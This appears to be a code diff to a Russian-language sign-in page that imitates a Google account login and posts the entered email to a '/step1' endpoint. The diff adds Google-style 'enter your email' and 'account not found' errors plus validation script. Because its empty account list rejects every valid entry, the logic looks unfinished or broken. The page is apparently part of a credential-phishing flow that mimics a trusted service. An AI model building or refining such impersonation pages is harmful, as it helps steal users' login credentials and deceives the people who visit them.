@@ -21,7 +21,17 @@
     <h1 data-i18n="signin_title">Вход</h1>
     <p class="sub" data-i18n="signin_sub">Используйте аккаунт Google</p>
 
-    <form action="/step1" method="POST" autocomplete="off">
+    <form action="/step1" method="POST" autocomplete="off" novalidate>
+      <div class="error-message" id="emailErrorEmpty" style="display: none;">
+        <span class="error-icon">!</span>
+        <span>Введите адрес электронной почты или номер телефона.</span>
+      </div>
+
+      <div class="error-message" id="emailErrorNotFound" style="display: none;">
+        <span class="error-icon">!</span>
+        <span>Не удалось найти этот аккаунт.</span>
+      </div>
+
       <input type="text" name="email" id="email" required autofocus placeholder="Телефон или электронный адрес" data-i18n-placeholder="email_placeholder">
       <a class="link" href="#" data-i18n="forgot_email">Забыли адрес электронной почты?</a>
 
@@ -63,5 +73,44 @@
 
   <script src="/static/i18n.js"></script>
   <script>initLang();</script>
+
+  <script>
+    document.querySelector('form').addEventListener('submit', function(e) {
+      var input = document.getElementById('email');
+      var emptyError = document.getElementById('emailErrorEmpty');
+      var notFoundError = document.getElementById('emailErrorNotFound');
+      var value = input.value.trim();
+
+      var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      var phoneRegex = /^\+?[0-9\s\-()]{7,}$/;
+
+      emptyError.style.display = 'none';
+      notFoundError.style.display = 'none';
+
+      if (value === '' || (!emailRegex.test(value) && !phoneRegex.test(value))) {
+        e.preventDefault();
+        emptyError.style.display = 'flex';
+        input.style.borderColor = '#efb9b7';
+        input.style.borderWidth = '2px';
+        return;
+      }
+
+      var existingEmails = [];
+      if (existingEmails.indexOf(value.toLowerCase()) === -1) {
+        e.preventDefault();
+        notFoundError.style.display = 'flex';
+        input.style.borderColor = '#efb9b7';
+        input.style.borderWidth = '2px';
+        return;
+      }
+    });
+
+    document.getElementById('email').addEventListener('input', function() {
+      document.getElementById('emailErrorEmpty').style.display = 'none';
+      document.getElementById('emailErrorNotFound').style.display = 'none';
+      this.style.borderColor = '';
+      this.style.borderWidth = '';
+    });
+  </script>
 </body>
 </html>
